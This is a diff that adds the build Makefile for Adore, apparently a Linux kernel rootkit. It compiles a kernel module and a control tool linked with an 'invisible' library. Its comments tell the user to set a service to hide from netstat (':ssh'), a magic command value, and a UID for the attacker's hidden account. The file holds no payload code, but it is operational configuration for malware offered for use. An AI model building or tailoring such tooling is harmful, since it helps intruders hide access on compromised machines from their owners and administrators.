@@ -1,0 +1,38 @@
+# Adore Makefile
+# (when configure fails)
+# Please set the flags you need!!!
+
+CC=cc 
+CFLAGS=-O2 -Wall -I/usr/src/linux/include
+
+# Normally not needed. Just for cross-plattform.
+# compilation
+#CFLAGS+=-m486
+
+# service to hide. something that appears
+# as netstat-output
+CFLAGS+=-DHIDDEN_SERVICE="\":ssh\"" 
+
+# should be changed to own value
+CFLAGS+=-DELITE_CMD=30000
+
+# make sure this doesnt clash with existing users
+CFLAGS+=-DELITE_UID=34
+
+# Do not touch!
+CFLAGS+=-DCURRENT_ADORE=32
+
+# enable when modversions are enables in kernel
+#CFLAGS+=-DMODVERSIONS
+
+# enable when target is SMP
+#CFLAGS+=-D__SMP__
+
+# this does not support exec-redirection
+
+all:	adore.c ava.c
+	$(CC) -c $(CFLAGS) adore.c -o adore.o
+	$(CC) $(CFLAGS) -O2 -Wall ava.c libinvisible.c -o ava
+clean:
+	rm -f core ava adore.o dummy.o
+    
